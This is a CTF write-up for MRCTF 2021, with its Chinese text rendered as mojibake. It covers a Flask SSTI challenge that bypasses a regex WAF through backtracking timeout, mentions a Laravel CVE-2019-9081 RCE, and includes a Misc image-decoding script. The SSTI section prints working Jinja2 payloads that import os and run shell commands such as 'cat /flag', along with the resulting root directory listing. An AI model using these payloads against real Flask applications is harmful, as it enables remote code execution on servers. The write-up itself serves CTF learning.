itâ€™s unbreakable now. node.mrctf.fun:15000 /waf æºç ï¼š import re,sys import timeout_decorator @timeout_decorator.timeout(5) def waf(url): # only xxx.yy-yy.zzz.mrctf.fun allow pat = r'^(([0-9a-z]|-)+|[0-9a-z]\\.)+(mrctf\\.fun)$' if re.match(pat,url) is None: print(\"BLOCK\",end='') # æ‹¦æˆª else: print(\"PASS\",end='') # ä¸æ‹¦æˆª if __name__ == \"__main__\": try: waf(sys.argv[1]) except: print(\"PASS\",end='') å¯ä»¥æ³¨æ„åˆ°å¦‚æœè¶…æ—¶äº†çš„è¯ except é‡Œä¹Ÿæ˜¯ PASSã€‚ å¦å¤–å‘ç° server æ˜¯ gunicornï¼Œæºç ä¹Ÿæ˜¯ pythonï¼Œç›²çŒœæ˜¯ flask æ¨¡æ¿æ³¨å…¥ã€‚ å‘ç°è²Œä¼¼å¯ä»¥æ­£åˆ™å›æº¯è¶…æ—¶+ç©ºè¡Œç»•è¿‡ã€‚ xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun {{161*1651}} eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3sxNjEqMTY1MX19 GET /api/spider/eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3sxNjEqMTY1MX19 è¿”å› è¯» / {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"ls -al /\")[\"read\"]()}} http://node.mrctf.fun:15000/api/spider/eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3siIlsiXHg1Zlx4NWZjbGEiInNzXHg1Zlx4NWYiXVsiXHg1Zlx4NWZiYSIic2VceDVmXHg1ZiJdWyJceDVmXHg1ZnN1YmNsYSIic3Nlc1x4NWZceDVmIl0oKVs0MDhdWyJceDVmXHg1ZmluIiJpdFx4NWZceDVmIl1bIlx4NWZceDVmZ2xvIiJiYWxzXHg1Zlx4NWYiXVsiXHg1Zlx4NWZidWlsdGluc1x4NWZceDVmIl1bIlx4NWZceDVmaW1wb3J0XHg1Zlx4NWYiXSgib3MiKVsicG9wZW4iXSgibHMgLWFsIC8iKVsicmVhZCJdKCl9fQ== è®¿é—®'xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun total 88 drwxr-xr-x 1 root root 4096 Apr 11 11:55 . drwxr-xr-x 1 root root 4096 Apr 11 11:55 .. -rwxr-xr-x 1 root root 0 Apr 11 10:05 .dockerenv dr-xr-xr-x 1 root root 4096 Apr 11 10:05 app drwxr-xr-x 1 root root 4096 Mar 30 23:04 bin drwxr-xr-x 2 root root 4096 Mar 19 23:44 boot drwxr-xr-x 5 root root 340 Apr 11 10:05 dev drwxr-xr-x 1 root root 4096 Apr 11 10:05 etc -rw-r--r-- 1 root root 2 Apr 11 11:55 flag drwxr-xr-x 2 root root 4096 Mar 19 23:44 home drwxr-xr-x 1 root root 4096 Mar 30 23:04 lib drwxr-xr-x 2 root root 4096 Mar 29 00:00 lib64 drwxr-xr-x 2 root root 4096 Mar 29 00:00 media drwxr-xr-x 2 root root 4096 Mar 29 00:00 mnt drwxr-xr-x 2 root root 4096 Mar 29 00:00 opt dr-xr-xr-x 507 root root 0 Apr 11 10:05 proc drwx------ 1 root root 4096 Apr 11 10:05 root drwxr-xr-x 3 root root 4096 Mar 29 00:00 run drwxr-xr-x 1 root root 4096 Mar 30 23:03 sbin drwxr-xr-x 2 root root 4096 Mar 29 00:00 srv dr-xr-xr-x 13 root root 0 Apr 11 10:05 sys drwxrwxrwt 1 root root 4096 Apr 11 10:05 tmp drwxr-xr-x 1 root root 4096 Mar 29 00:00 usr drwxr-xr-x 1 root root 4096 Mar 29 00:00 var 'å¤±è´¥ï¼ whoami ==&gt; root è¯» flag xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"cat /flag\")[\"read\"]()}} MRCTF{eeeeeeeeeeeeeeeeeeeeez_NFA-WAF_8ypaS5!} è¯»ä¸€ä¸‹é¢˜ç›®æºç  start.py from flask import Flask, request,render_template,url_for from jinja2 import Template import requests,base64,shlex,os app = Flask(__name__) @app.route(\"/\") def index(): return render_template('index.html') @app.route(\"/waf\") def wafsource(): return open(\"waf.py\").read() @app.route(\"/source\") def appsource(): return open(__file__).read() @app.route(\"/api/spider/&lt;url&gt;\") def spider(url): url = base64.b64decode(url).decode('utf-8') safeurl = shlex.quote(url) block = os.popen(\"python3 waf.py \" + safeurl).read() if block == \"PASS\": try: req = requests.get(\"http://\"+url,timeout=5) return Template(\"è®¿é—®æˆåŠŸ!ç½‘é¡µè¿”å›äº†{}å­—èŠ‚æ•°æ®\".format(len(req.text))).render() except: return Template(\"è®¿é—®{}å¤±è´¥ï¼\".format(safeurl)).render() else: return Template(\"WAFå·²æ‹¦æˆªï¼Œè¯·ä¸è¦ä¹±è¾“å…¥å‚æ•°ï¼\").render() if __name__ == \"__main__\": app.run(host=\"0.0.0.0\",port=5000,debug=True) å•Š æœ‰ /source æºç æ³„éœ²çš„å•Šï¼ˆï¼ˆä¸‹æ¬¡åšé¢˜å…ˆæ‰«ä¸€æ‰«å¥½äº† è®²ä¸ªç¬‘è¯ï¼Œè¿™é¢˜æ‰“çš„æ—¶å€™æœ€å¼€å§‹è¿˜è¯»åˆ°æœ‰ flag çš„ï¼Œç„¶åå‘ç°å†…å®¹æ˜¯ 1ã€‚ å†ä¸€è¯»å‘ç°æ²¡ä¸œè¥¿äº†ã€‚å†ä¸€çœ‹æ ¹ç›®å½•ï¼Œflag ä½ å»å“ªäº†â€¦â€¦ é—®äº†é—®å‡ºé¢˜äºº å™¢å¯¹ï¼Œroot æƒé™ xswlï¼ Extensive Reading: PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ ez_larave1 http://node.mrctf.fun:10012/ https://drive.buptmerak.cn/s/afGBmP8zjg47orG æ ¹æ®ä¿®æ”¹æ—¶é—´ï¼Œçœ‹ä¸€çœ‹æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶ã€‚ Laravel ç‰ˆæœ¬ç”¨çš„æ˜¯ 5.7.29ï¼ŒæŸ¥äº†æŸ¥å‘ç°æœ‰ä¸ª RCEã€‚ ç„¶åè¿™é‡Œçš„ PendingCommand.php æŠŠ __destruct() é‡Œçš„ run ç»™æ³¨é‡Šæ‰äº†ã€‚ ä¹‹åå†å‚è€ƒä¸‹é¢çš„å‡ ç¯‡ Laravelå…¥å‘ä¹‹CVE-2019-9081å¤ç°åˆ†æ Laravel 5.7ååºåˆ—åŒ–æ¼æ´(CVE-2019-9081+2020ç¬¬äº”ç©ºé—´é¢˜è§£) æ‰¾ä¸ªèƒ½æ‰§è¡Œä»£ç çš„åœ°æ–¹ï¼Œæ‰§è¡Œè¿™ä¸ª run å°±å¥½ã€‚ ï¼ˆåé¢å†æ¥å¤ç°ï¼Œå’•å’•å’• Miscplane This plane cannot fly~~~ Hint: plane:721x-402y+9110z-1197483=0 ![(153, 15, 120),(51, 104, 132),(229, 38, 115)](CTF_2021MRCTF/(153, 15, 120),(51, 104, 132),(229, 38, 115).png) å›¾ç‰‡å¥½èŠ±å•Šï¼Œçœ‹äº†ä¸€ä¸‹å‘ç°åœ¨ blue plane ç¬¬7å±‚å­˜åœ¨å¥‡æ€ªçš„ä¸œè¥¿ã€‚ ç„¶è€Œæå–å‡ºæ¥å•¥ä¹Ÿçœ‹ä¸å‡ºã€‚ æ ¹æ®é¢˜ç›® hintï¼Œä¼°è®¡æ˜¯è¦æ ¹æ® 721x-402y+9110z-1197483=0 è¿™ä¸ªç©ºé—´å¹³é¢æ¥åˆ’åˆ†å›¾åƒç©ºé—´ï¼Œä¸€åŠæ˜¯é»‘ï¼Œä¸€åŠæ˜¯ç™½ã€‚ æŒ‰ç…§é¢˜ç›®æœ¬æ„çš„è¯ï¼Œåº”è¯¥æ˜¯éœ€è¦æ ¹æ® (153, 15, 120), (51, 104, 132), (229, 38, 115) è¿™ä¸‰ä¸ªåæ ‡æ¥æ±‚å‡ºæ‰€ç»™çš„å¹³é¢çš„ï¼Œä¸è¿‡å³ä½¿ç»™å‡ºæ¥äº†å½“æ—¶è¿˜æ˜¯æ²¡æ•´å‡ºæ¥ï¼ˆï¼ˆ å†™ä¸ªè„šæœ¬ã€‚ # coding: utf-8 \"\"\" MRCTF2021 Misc plane MiaoTony \"\"\" from PIL import Image im = Image.open('(153, 15, 120),(51, 104, 132),(229, 38, 115).png') rgb_im = im.convert('RGB') print(rgb_im.size) # (400, 400) width = rgb_im.width height = rgb_im.height im2 = Image.new('RGB', rgb_im.size) for j in range(height): for i in range(width): r, g, b = rgb_im.getpixel((i, j)) if 721*r-402*g+9110*b-1197483 &gt; 0: im2.putpixel((i, j), (255, 255, 255)) # im2.show() # im2.save('test1.png') å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œå’Œ blue plane 7 å¾ˆç±»ä¼¼ã€‚ï¼ˆå°±æ˜¯æ¨¡ä»¿ blue plane 7 ç¡®å®šçš„é»‘ç™½ï¼‰ æ”¾å¤§æ¥çœ‹æ˜¯è¿™æ ·çš„ã€‚ å›¾ç‰‡ çºµå‘æ–¹å‘ä¸Š å¯ä»¥å‘ç°åˆ†äº†å¾ˆå¤šå±‚ï¼ŒçŒœæƒ³æ˜¯æŠŠäºŒè¿›åˆ¶çš„ ASCII ç¼–ç åˆ°äº†é»‘ç™½åƒç´ ä¸­äº†ã€‚ æ ¹æ®æœ€å³è¾¹çºµå‘å¯ä»¥ä¼°è®¡æ˜¯ 10000110ï¼Œä¸å¯¹ï¼Œåè¿‡æ¥ï¼Œ01100001ï¼Œæ­£å¥½æ˜¯ ASCII é‡Œçš„ aã€‚äºæ˜¯éœ€è¦ä¸Šä¸‹åè¿‡æ¥è§£ç ã€‚ è€Œä¸”è¿˜æ˜¯ä»ä¸Šåˆ°ä¸‹ï¼Œä¸€åˆ—æœ‰50ä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦ä»ä¸Šåˆ°ä¸‹æ˜¯ä½ä½åˆ°é«˜ä½ã€‚ ï¼ˆå¤ç°çš„æ—¶å€™å…¶å®è¿™é‡Œè¯•äº†å¥½å¤šæ¬¡æ‰å‘ç°çš„â€¦â€¦ ç„¶åå†™ä¸ªè„šæœ¬è§£ç å§ã€‚ï¼ˆæ¥ä¸Šé¢çš„ï¼‰ data = '' for i in range(width): cnt = 0 x = '' for j in range(height): if im2.getpixel((i, j))[0] == 0: x = '1' + x else: x = '0' + x cnt += 1 if cnt % 8 == 0: # print(x) ch = chr(int(x, 2)) # print(ch) data += ch x = '' print(data) with open('result.txt', 'w', encoding='utf-8') as f: f.write(data) å¤„ç†å¾—åˆ° Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMVV5TVRSVk1rcElaSHBHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZjRWRaTUZaM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOc2NFaGpSbEpUVmxoQ1dsWXhXbE5TTWxGNVVtdGthbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFhXSEJIVkRKU1YxWnVVbWhTYXpWeldXeG9iMWRHV25STlNHUnNVakJzTkZVeWRHdFhSMHBJVld4c1dtSkhhRlJXTUZwVFZqSkdSbFJzVG1sU2JrSmFWMnhXWVZReFdsaFRiRnBZVmtWd1YxbHJXa3RTUmxweFVWaG9hMVpzV2pGV01uaGhZVWRGZUdOR2JGaGhNVnBvVmtSS1QyTXlUa1phUjJoVFRXNW9WVlpHWTNoaU1rbDRWMWhvV0dKRk5WVlVWM1J6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2toaFJsSlhUVVp3VkZacVNrZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JUVW14d2VGVldhRzloTVZwelYycEdWMDF1YUdoWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5V1ZscEhXVE5vYVUxcmJEUldNV2h2VjBkS1JrNVdWbFZXTTFKNlZHdGFWbVZYVWtoa1JtaFRUVWhDU2xac1pEUmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZkR1NsWmpSV3hYWWxoQ1RGUnJXbEpsUm1SellVWlNhRTFzU25oV1Z6QjRUa2RHUjFaWVpHaFNWVFZWVlcxNGQyVkdWblJOVldSV1RXdHdWMWxyVW1GWFIwVjRZMGhLV2xaWFVrZGFWV1JQVTBVNVYxcEhhR2hOU0VKMlZtMTBVMU14VVhsVmEyUlVZbXR3YjFWcVNtOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25KbFJtUnlXa1prVjJFelFqWldhMlI2VFZaWmQwMVdXbWxsYTFwWVdXeG9RMU14VWxkYVJWcHNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdXR3hyVWtWS1dGUldXbmRsVm10M1YyNWtXRkl3VmpSWk1GSlBWakpHY2xkcmVGZGhhM0JRVlRGa1MxSXhjRWRhUms1WFYwVktNbFp0TVRCVk1VMTRWVmhzVlZkSGVGWlpWRVozWWpGV2NWUnJUbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaGpiVXBGVld4a1RsWXlhREpXTVZwaFV6RkplRlJ1VG1GU2JGcFlXV3RhZDA1c1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp0ZUhkTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRnFWbGRTTTJob1ZrUktSMVl4VG5WVmJFSlhVbFJXV1ZaR1l6RmlNV1JIWWtoR1ZHRXhjSE5WYlRGVFYyeGtjbFpVUmxkTlZuQjZXVEJhVjFkR1dYcFZia3BYVmtWYWVsWnFSbGRqTVdSellVZHNWMVp1UWxGV2ExcGhXVmRSZVZaclpGZFhSM2h5Vld0V1MxZEdVbGRYYm1Sc1ZtMTBNMVl5Tld0WFJrbDNWbXBTV2sxR1NsQldha3BIWTJ4a2NtVkdaR2hoTTBKUlZsUkdhMU14U1hoalJXUmhVbXMxV0ZZd1ZrdE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR1ZHV2xwV1JWb3pXV3BHVjJOV1VuSlViR1JUWWxob05WWnRNREZoTVZsNFYyNU9hbEpGU21oV2JHUk9UVlphV0dNemFGaFNiRm94V1RCYWExUnNXWGxoUkVwWFlXdEtjbFY2Umt0amF6VlhXa1phYVZKc2NGbFdSbEpMWWpGT1YxZHJhR3hTTUZwWVZGZDRTMU5XV2xoa1J6bG9UVlZzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMFpVaGtUazFYZUZkV01qVnJWVEpLU1ZGcmFGZFNNMmhVVmxSS1JtVnNSbkZXYkdSVFRUSm9iMVpyVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGRoYTNCSVdUSjRhMk50VmtkYVJUVlhZbXRLU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlVWndhVmRIYUc5V2JURTBZekpOZUdORmFGQldiVkpVV1d0V2QxZHNXa2hsUjNCUFZteHNORll5TlU5aGJFcFlZVVpzVjJFeFZYaGFSM2h6VmpGYVdXRkhjR2xXV0VKSFZteGtOR0V4VW5OWFdHeG9Va1Z3V0ZsWGRFdGpiRlkyVW10MGFtRjZWbGhYYTFwcllWWktjMk5HYkZkU2JFcElWWHBCTVdNeFpISmhSM1JUVFVad1dWZFhlR0ZaVm1SWFYyeG9hMUo2Ykc5VVZsWjNUVVpzVmxkc1RsZFdiSEJaV1ZWV1UxWnJNWFZoUjJoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGSllhR0ZTVjJoVldXdGtiMkl4Vm5GUmJVWlhZa1p3TUZwVmFHdFVhekZZWlVaa1YwMXFWbkpXVkVwTFUxWkdjbHBHVms1V2JGVjRWMVphWVZNeFpGZFNiR3hoVW0xb2NGVnRlSGRpTVZweVZXdDBVMDFXYkRSV1Z6VkxWMGRLUjFOdVFsZGlSbkF6VmpGYVlWSXhiRFpTYld4T1ZqRktTVmRYZEc5U01WcElVbGhvYWxORk5WZFpiRkpIVmtaWmVXVkhkR3BpUm5CV1ZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1JaWTBaYWFXRXpRbGxXYlhSWFdWZFdjMWR1UmxOaVIxSnhWRlprVTJWc2JGWmFTRTVYVFZad01WVlhlRWRXTWtWNFkwZG9XRlp0VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a01GWXhUWGhhUldSV1lrZFNXVmx0TVZOak1WcDBUVlJDVGsxV2JEVlViR1F3VjBaS2NtSkVUbGRpV0VKVVZqSnplRkl4VG5OUmJHUk9ZV3RhU0Zkc1dtRldNazV6WTBWb1UySkhVazlVVnpGdlUyeFplRlZyY0d4U2F6RTBWVEZvYjJGc1NsaGhTRUpXWWxSR2RsWnJXbUZqTWtaR1ZHeFNUbFp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZV1d0a2IyUnNXWGRYYlhSVVVqQmFTRmxyV25kaFZtUklZVWM1VjJKVVJUQlpla3BQWXpKT1JtRkdRbGROTUVwVlYxZDBiMUV3TlVkWGJGWlVWMGRTVUZacVFuZFRWbFY1WkVjNVYySlZjRWxhVldSdlZqSktTRlZyT1ZWV2JIQjZWbXBHWVZkWFJraGpSMnhYVjBWS1NGWnRlR3RPUjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxMGQySkdTbk5UYWtaWFVucEdTRlpVU2t0U01rNUhZa1pvVjAweFNtOVhhMUpDVFZkTmVGcElTbWhTTTJoVVZGVmFkMkZHV25STlNHaFdUVlUxV0ZZeU5WTmhNVW8yWWtjNVZWWnNXbnBVYkZwelZtMUdSbFJzWkdsV1dFSktWMVpXVjFReGJGZFRhMXBZWW10d1dGbFhkR0ZoUm5CR1ZsUldWMDFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUmxwWVVqSm9XbGRYTVhwTlZscFhZa2hLWVZKNmJGaFphMXAzWld4WmVVNVhkRlZoZWtaWVdUQm9jMVl3TVhGU2EyaGFWak5vYUZreU1VOVNWa1owVW14T1YwMVZXWHBXYlhoVFV6RktkRlp1VGxOaVIzaG9WVzB4YjJOR1ZuUmxTR1JwVFZkU1dGWlhkREJWTURGWFlrUlNWMUo2VmxoV2JHUkxWMGRHUms5V1ZsZGxhMW95Vm1wR1lXRXhXWGhXYmtwaFVqTlNUMWxVUm5kVFZscHhVMnBTVjAxV1ZqVlZNblJyWVd4T1JrNVdaRnBpUmtwSVZtdGFVMVl4WkhOWGJYaFhUVVJSZVZaWE1UUmlNVlY1VWxod1VtSlZXbGhXYlRGT1pVWnNjVkpzY0d4U2JWSjRWako0UzJGSFNrWmpSMmhZVm0xUmQxZFdXbk5XTWs1SFYyeG9hVkl4U25oV1JtUXdXVlpKZUZWWWFGaGlXRkp2VldwR1lXVnNXWGxqUjBaWFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMDFHV1hoVVdHaGhVbGRTVjFsclpGTlhWbXgwVFZaT2FrMVdjREJhVldoUFZERmFkVkZzWkZwV1YxRjNWakJhU21ReVRrWmhSbkJPVW01Q01sWnFTbnBsUms1SFZtNVdXR0pIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYkdoVlZteGFNMVpYZUdGak1WWnlXa2RvVGxaVVJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXeG9UbVZHV1hkWGJIQnJUVlp3ZVZwRlZURmhWa3AxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWbTB3ZUdJeVZuTlhiazVZWWxoU1ZWVnFSbUZUUmxsNVpVaGtWMDFWY0ZoWmFrNTNWMFpaZWxGcmFGZGhhM0JRVm1wR1YyUldUbk5XYld4VFRWVndWbFl4WkRSaU1rbDNUbFprV0dKc1NrOVZhMVpoWWpGU1YxZHVUazlTYkd3MVZHeFZOV0ZIU2taalJXUldUV3BHZGxacVNrdFRSbFp5VDFaV1YySklRbTlXYWtKclZHMVdkRkpyWkdoU2F6VndWVzB3TlU1R1dYaFZhMDVhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcHpWMGRTUm1SSGNHbFNiR3Q1VmxjeE1FMUhSblJTYWxwWFlrZG9XVmxVUm5kaFJteFhWMnQwYWsxck5VaFphMXByVlRKS1JtTkZNVmhXTTBKSVZrUkdXbVZHY0VsVGJXaFRUVEpvVlZaR1ZtRmtNV1JYVjJ0a1lWSkdTbFZVVmxVeFYwWlplV1ZIT1doTlZXOHlXV3RqTlZaV1duTlhhazVWVmxad2VsWnRlR3RqTVZKeldrWmthVk5GU2xwV01WSkRZVEZKZUZkc1pGaGlhelZ4VldwS2IxbFdjRmhrUjBaT1RWWmFlbFl5ZUd0aE1VbDNUbFZrVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdWZFVRbTlqTVZsM1RWaEdVMkV5YUdGV2FrNXZZVVpyZVUxVk9WTldhMW93VlcxNFQxWXdNVlpYV0hCWFlsaG9WRlY2Umt0a1JscDFWR3hPYVZJemFHOVdWekI0WWpKT1IxWnVVbXhUUjFKd1ZGWmtVMWRHV2xoa1JFSldUVVJHV0ZsclVsTldNVW8yVm14b1YySkhVa3hXTUdSSFVtczVWMVpzWkd4aE1XOTVWbTF3UjFsWFJYaFhXR2hYWW10d2FGVnFUbE5VTVd4VlVtNWtWRlpzY0hoVk1uQlRWakF4VjFacVZsWk5ibEp5V1ZkNFQxSnJOVmRhUm5CcFVtdHdTVlp0ZEdGVk1WbDRXa2hPV0dKWWFGaFVWVkpTWlZaYVdFMVVVbWhOVmtwNlZqSTFWMVZ0Um5OalJteFhZVEZhVEZsVldtRmpWa3AwWkVaT1RsWXhTWGhXYTJRMFZUSkdSazFZVW1oU2VteFlWbXBPVTFkR1pGZFhiazVYVFdzMVNGWXlNVWRWTVdSSFUyeGFWMkpVUmpaVVZtUlhZekpLUjFkdFJsTmxiWGhYVjFab2QxSXhXWGhoTTJSWVlsVmFXRlJYZEhkVFZscElZMFpPVjFZd1ZqVldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNbEY0VWxob2FWSnRhRlpaVkVwVFYwWnNkR1ZGZEdwTlZsWXpWMnRhVDJGck1WaGxTR3hYVFc1b2NsWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWVzA1V2xaRldqTlpha1poVjBVeFZWVnRhRTVoZWxWM1ZtMHhNR0V4YkZkVGJGWlhZa2RvWVZsc2FGTlVSbFY1WlVad2JGSnNXbmxaTUdRMFZUSkdObEpVUWxkV1JWcDJXV3BLUjJNeFRuTmhSbHBwVmpKb1dGZFhkR0ZUTVdSSFYydFdVMkpIVW5GVVYzUmhVakZhU0dWR1RsVmlSbkF4VlZab2ExWXhTbk5qUmxKV1ZrVmFhRmt5YzNoV01XUnlUbFprVTJFelFscFdNV1F3WVRKSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVVbTE0VjFZeU5XdGhSbHAwVld0c1dsWlhUVEZXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXYTFReFNuUlNhMlJTWWtkU2NGWnRkSGRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVZWc2JGcGlSMmhFVmxWYVlXTldSblZhUmxKWFlrWlpNVmRyVm1wT1ZsbDVVMnhhYWxKWGVHaFdiR1JUWkd4YWNWTnJkRlJTYkZwNVZERmFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5V2tkb1UyRjZWbmRXVnpCM1RsVTFSMWRZYUZaaE1EVmhWbXBDVjA1R1dsaE9WVGxZVW0xU1NWcFZZelZXYlVWNFYycE9WMDFHY0hwV01HUlRVbTFTU0dOSGJGTmlSM1ExVm14amQyVkZNVWRYV0dST1ZtMVNjVlZyVm1GV01WSllUbGM1VTFKc2NIaFZNblF3VmtaYWNsZHFSbGhoTVhCeVdWWmFhMUl4VG5OaVJtUnBWa1ZKTUZac1kzaFdNVWw0WTBWc1YySkZOWEJWYkdoRFpERmFkR1ZIUm10TmExcElWakkxVTFSc1drWlRia1pWVmxaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pTWlVkS1IxcEdVbWhOV0VKYVYxY3hNR1F4WkVkaVJtaHJVakJhYjFWdE5VTlNNVnB6Vld4a1YwMUVSbGhaTUdoelZsZEtSMk5JU2xwV2JWSkhXa1JHYTFkWFRrZGFSMnhZVWpKb05GWXlkRk5SYlZaSFYxaG9WbUpIZUc5VmJURnZZakZTV0UxWE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldTRlpYTVV0V2JHUnpZVVp3YUUxWVFYcFdSbFpoWkRGYWRGSnJhR3RTYkZwdldsZDBZVmRXWkZWUmJUbHFUVlpzTTFSV2FFZFZNa1Y1WVVkR1YyRnJOWFpaVlZweVpWZE9ObEpzYUZkTlNFSkpWMVpXYTJJeFVuTmFSVnBVWWtWd1dGUldXbmRoUm1SWFYyczFiRlpzU2pGV1YzaFhZVVV4VjJOR2NGaFdNMUp5VmxSS1NtVkdWbk5oUjNCc1lUQndVRlpYTUhoVk1XUnpZVE5rVjJKWVVsaFVWM1IzVjBaWmVXVkhPVmROVlc4eVZtMTRiMVl5UlhsVmEzaFdZV3RhVUZwR1drZGpNWEJJWWtaT2FXRXdXVEpXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkRE